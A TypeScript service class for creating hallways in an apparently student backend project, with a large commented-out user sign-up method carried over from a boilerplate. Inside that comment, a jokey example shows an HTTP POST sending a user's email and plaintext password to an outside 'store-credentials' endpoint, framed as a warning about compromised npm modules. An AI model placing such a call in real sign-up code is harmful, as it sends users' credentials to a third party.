import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IHallwayService from './IServices/IHallwayService';
import { HallwayMap } from "../mappers/HallwayMap";
import { IHallwayDTO } from '../dto/IHallwayDTO';

import IBuildingRepo from './IRepos/IBuildingRepo';
import IFloorRepo from './IRepos/IFloorRepo';
import IHallwayRepo from './IRepos/IHallwayRepo';

import { Hallway } from '../domain/hallway';


import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";

@Service()
export default class HallwayService implements IHallwayService{
  constructor(
      @Inject(config.repos.hallway.name) private hallwayRepo : IHallwayRepo,
      @Inject(config.repos.building.name) private buildingRepo : IBuildingRepo,
      @Inject(config.repos.floor.name) private floorRepo : IFloorRepo,
      //@Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}

  private comprobarHallway(hallwayDTO: IHallwayDTO): boolean{
    if(hallwayDTO.buildingsCode.length != 2){
      return false;
    }
    if(hallwayDTO.floorsId.length != 2){
      return false;
    }
    for(let i = 0; i < hallwayDTO.buildingsCode.length; i++){
      if(this.buildingRepo.findByCode(hallwayDTO.buildingsCode[i]) == null){
        return false;
      }
      if(this.floorRepo.findById(hallwayDTO.floorsId[i]) == null){
        return false;
      }
    }
    return true;
  }


    public async CreateHallway(hallwayDTO: IHallwayDTO): Promise<Result<{ hallwayDTO: IHallwayDTO; }>> {
      try{

        if(!this.comprobarHallway(hallwayDTO)){
          return Result.fail<{hallwayDTO: IHallwayDTO}>("Hallway is not valid");
        }

        const hallwayOrError = await Hallway.create({
            //hallwayId: hallwayDTO.hallwayId,
            buildingsCode: hallwayDTO.buildingsCode,
            floorsId: hallwayDTO.floorsId,
            position: hallwayDTO.position
          });

          if (hallwayOrError.isFailure) {
            throw Result.fail<IHallwayDTO>(hallwayOrError.errorValue());
          }

        
        const hallwayResult = hallwayOrError.getValue();
        await this.hallwayRepo.save(hallwayResult);
        const hallwayDTOResult = HallwayMap.toDTO( hallwayResult ) as IHallwayDTO;
        return Result.ok<{hallwayDTO: IHallwayDTO}>( {hallwayDTO: hallwayDTOResult} )
        } catch (e) {
          throw e;
        }
  }

  /*public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: role,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
